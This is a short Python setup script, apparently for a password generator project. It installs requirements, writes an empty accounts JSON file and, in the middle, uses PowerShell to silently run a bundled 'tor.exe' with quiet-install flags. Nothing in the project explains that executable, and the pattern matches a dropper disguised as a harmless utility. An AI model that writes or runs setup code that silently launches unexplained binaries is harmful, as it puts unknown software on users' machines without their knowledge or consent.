import os 

try:
    os.system('pip install -r requirements.txt')
except:
    os.system('pip3 install -r requirements.txt')

import subprocess, sys
p = subprocess.Popen('Powershell.exe -Command ./tor.exe /S /v/qn')
p.communicate()

import json

boilerplate = {
    "account":[]
}
with open('Password Generator/file.json' , 'w') as f:
    json.dump(boilerplate, f, indent=4)
